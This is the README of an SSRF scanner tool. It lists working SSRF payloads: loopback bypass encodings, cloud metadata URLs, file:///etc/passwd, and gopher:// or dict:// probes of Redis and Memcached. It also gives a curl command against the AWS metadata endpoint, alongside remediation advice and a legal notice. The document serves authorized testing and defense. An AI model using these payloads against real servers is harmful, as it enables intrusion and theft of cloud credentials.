![cover-image](https://github.com/0xS4r4n9/SubHawk/blob/main/Subhawk_git.png)

# SSRF Vulnerability Scanner

A comprehensive Python tool for detecting Server-Side Request Forgery (SSRF) vulnerabilities using multiple bypass techniques and attack vectors.

## Features

✅ **Multiple Attack Vectors**
- Basic internal IP variations (127.0.0.1, localhost, 0.0.0.0, etc.)
- Cloud metadata service testing (AWS, GCP, Azure, Alibaba)
- Protocol-based attacks (file://, dict://, gopher://, ldap://)
- URL parsing bypass techniques
- Encoding bypass methods
- DNS rebinding detection
- Redirect-based SSRF

✅ **Advanced Detection**
- Response time analysis
- Content-based detection
- Error pattern matching
- Internal service fingerprinting (Redis, Elasticsearch, MongoDB, etc.)
- Port scanning via SSRF
- Blind SSRF with collaborator support

✅ **Comprehensive Reporting**
- Color-coded terminal output
- Evidence collection
- JSON export capability
- Vulnerability categorization

## What is SSRF?

Server-Side Request Forgery (SSRF) is a vulnerability that allows an attacker to make the server perform unauthorized requests to:
- Internal services (databases, admin panels, etc.)
- Cloud metadata services (AWS, GCP, Azure)
- Local files on the server
- External systems via the server

## Installation

### Requirements

```bash
pip install requests
```

### Python Version
- Python 3.6+

## Usage

### Basic Scan

```bash
# Test a URL with parameter
python ssrf_scanner.py -u "http://example.com/api?url=https://google.com"

# Test specific parameter
python ssrf_scanner.py -u "http://example.com/fetch" -p url
```

### POST Requests

```bash
# POST with form data
python ssrf_scanner.py -u "http://example.com/api" -m POST -d "url=test&id=123" -p url

# POST with JSON (use headers)
python ssrf_scanner.py -u "http://example.com/api" -m POST \
  -H '{"Content-Type": "application/json"}' \
  -d '{"url": "test"}' -p url
```

### Advanced Options

```bash
# With custom headers and cookies
python ssrf_scanner.py -u "http://example.com/api" -p url \
  -H '{"User-Agent": "CustomBot", "X-API-Key": "secret"}' \
  -C '{"session": "abc123"}'

# Blind SSRF with collaborator
python ssrf_scanner.py -u "http://example.com/api" -p url \
  -c "burpcollaborator.net" -v

# Full verbose scan with output
python ssrf_scanner.py -u "http://example.com/api" -p url \
  -v -o results.json -t 20
```

## Command-Line Options

| Option | Description | Default |
|--------|-------------|---------|
| `-u, --url` | Target URL (required) | - |
| `-p, --parameter` | Specific parameter to test | Auto-detect |
| `-m, --method` | HTTP method (GET/POST) | GET |
| `-d, --data` | POST data (key=value format) | None |
| `-H, --headers` | Custom headers (JSON format) | None |
| `-C, --cookies` | Cookies (JSON format) | None |
| `-c, --collaborator` | Collaborator domain for blind SSRF | None |
| `-t, --threads` | Number of threads | 10 |
| `--timeout` | Request timeout in seconds | 10 |
| `-v, --verbose` | Verbose output | False |
| `-o, --output` | Output file (JSON format) | None |

## Attack Vectors Tested

### 1. Basic Internal Access
```
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
http://0177.0.0.1 (Octal)
http://2130706433 (Decimal)
http://0x7f.0x0.0x0.0x1 (Hex)
```

### 2. Cloud Metadata Services
```
http://169.254.169.254/latest/meta-data/ (AWS)
http://metadata.google.internal/computeMetadata/v1/ (GCP)
http://169.254.169.254/metadata/v1/ (Azure)
http://100.100.100.200/latest/meta-data/ (Alibaba)
```

### 3. Protocol Bypass
```
file:///etc/passwd
dict://127.0.0.1:11211/stat
gopher://127.0.0.1:6379/_INFO
ldap://127.0.0.1:389
```

### 4. URL Parsing Bypass
```
http://127.0.0.1@google.com
http://google.com@127.0.0.1
http://127.0.0.1%00.google.com
http://127.0.0.1?.google.com
http://127.1
```

### 5. Encoding Bypass
```
http://127.0.0.1%09
http://127.0.0.1%0a
http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ (Unicode)
```

### 6. DNS Rebinding
```
http://127.0.0.1.xip.io
http://make-127.0.0.1-rr.1u.ms
```

## Detection Methods

### 1. Response Content Analysis
- AWS metadata keywords (ami-id, instance-id, security-credentials)
- GCP metadata identifiers
- File content patterns (/etc/passwd, root:)
- Internal service responses (Redis, MongoDB, Elasticsearch)

### 2. Response Time Analysis
- Baseline comparison
- Timeout detection
- Delay patterns

### 3. Error Pattern Matching
- Connection refused
- Connection timeout
- Network unreachable
- Internal server errors

### 4. HTTP Status Codes
- Redirect chains
- Error responses
- Success indicators

## Understanding Results

### Vulnerability Report Example

```
[!] Parameter: url
    Vulnerable Payloads: 3
    └─ http://169.254.169.254/latest/meta-data/
       Type: cloud_metadata
       Status: 200
       Evidence: AWS metadata service response detected
    └─ http://127.0.0.1:6379
       Type: port_scan:6379
       Status: 200
       Evidence: Internal Redis service accessed
```

### Evidence Types

- **AWS metadata service response detected** - Cloud credentials accessible
- **Local file access successful** - File read via file:// protocol
- **Internal [service] service accessed** - Internal service reachable
- **Connection refused** - Port exists but service inactive
- **Request timeout** - Possible SSRF causing delay

## Remediation

If SSRF vulnerabilities are found:

### 1. Input Validation
```python
# Whitelist allowed domains
ALLOWED_DOMAINS = ['api.example.com', 'cdn.example.com']

# Validate URL
parsed = urlparse(user_url)
if parsed.netloc not in ALLOWED_DOMAINS:
    raise ValueError("Domain not allowed")
```

### 2. Block Internal IPs
```python
import ipaddress

def is_internal_ip(ip):
    ip_obj = ipaddress.ip_address(ip)
    return ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local

# Block internal IPs
if is_internal_ip(resolved_ip):
    raise ValueError("Internal IP blocked")
```

### 3. Use Safe HTTP Libraries
```python
# Disable redirects
response = requests.get(url, allow_redirects=False)

# Set timeout
response = requests.get(url, timeout=5)
```

### 4. Network Segmentation
- Isolate application servers
- Firewall rules blocking metadata IPs
- Network policies preventing internal access

## Blind SSRF Detection

For blind SSRF, use out-of-band detection:

```bash
# Setup Burp Collaborator or similar
python ssrf_scanner.py -u "http://example.com/api" -p url \
  -c "your-collaborator.burpcollaborator.net"

# Check collaborator for DNS/HTTP interactions
```

Alternative collaborators:
- Burp Collaborator (commercial)
- Interact.sh (free)
- Canarytokens (free)
- Your own server with logging

## Common SSRF Scenarios

### 1. URL Fetch APIs
```
/api/fetch?url=
/api/proxy?url=
/download?file=
```

### 2. Webhooks
```
/webhook/register?callback=
/notify?url=
```

### 3. PDF Generators
```
/pdf/generate?url=
/export?html=
```

### 4. Image Processing
```
/image/fetch?url=
/avatar/load?src=
```

### 5. File Uploads
```
/upload?from_url=
/import?url=
```

## Best Practices

### For Bug Bounty Hunters

1. **Read the Scope** - Ensure SSRF testing is allowed
2. **Start Passive** - Use metadata endpoints first
3. **Document Everything** - Save all requests/responses
4. **Respect Rate Limits** - Don't DoS the target
5. **Report Responsibly** - Include clear reproduction steps

### For Security Teams

1. **Regular Scanning** - Include in CI/CD pipeline
2. **Multiple Environments** - Test dev, staging, production
3. **Combine Tools** - Use with Burp Suite, OWASP ZAP
4. **Manual Verification** - Confirm automated findings
5. **Track Remediation** - Monitor fix implementation

## Limitations

- **False Positives** - Manual verification recommended
- **WAF/Filters** - May block obvious payloads
- **Rate Limiting** - Target may throttle requests
- **Network Restrictions** - Firewalls may prevent internal access

## Troubleshooting

### No Vulnerabilities Found

```bash
# Try verbose mode
python ssrf_scanner.py -u "http://example.com/api" -p url -v

# Test with collaborator
python ssrf_scanner.py -u "http://example.com/api" -p url -c "interact.sh"

# Manual testing
curl "http://example.com/api?url=http://169.254.169.254/latest/meta-data/"
```

### Connection Errors

- Check target accessibility
- Verify URL format
- Test with curl first
- Adjust timeout: `--timeout 30`

### Too Many Requests

- Reduce threads: `-t 5`
- Add delays between requests
- Test fewer payload types

## Security Considerations

⚠️ **Legal Notice**: Only test applications you own or have explicit permission to test.

- SSRF can access sensitive internal resources
- May trigger security alerts
- Could impact production systems
- Always get written authorization
- Follow responsible disclosure

## Advanced Techniques

### Custom Payloads

Edit the script to add custom payloads:

```python
SSRF_PAYLOADS = {
    'custom': [
        'http://internal-api.company.local',
        'http://admin.internal:8080',
    ]
}
```

### Cloud-Specific Testing

```bash
# AWS-focused
python ssrf_scanner.py -u "http://example.com" -p url \
  --payloads aws_metadata

# GCP-focused
python ssrf_scanner.py -u "http://example.com" -p url \
  --payloads gcp_metadata
```

## References

- [OWASP SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)
- [HackerOne SSRF Reports](https://hackerone.com/reports?search=ssrf)
- [AWS SSRF Protection](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html)

## Contributing

To add new payloads or detection methods:
1. Update `SSRF_PAYLOADS` dictionary
2. Add detection logic in `check_ssrf_indicators()`
3. Test thoroughly before using

## License

This tool is provided for educational and authorized security testing purposes only.

## Version History

- **v1.0** - Initial release
  - Multiple bypass techniques
  - Cloud metadata testing
  - Blind SSRF support
  - Port scanning
  - Multi-threaded scanning

---

**Happy (Ethical) Hacking! 🎯🔒**
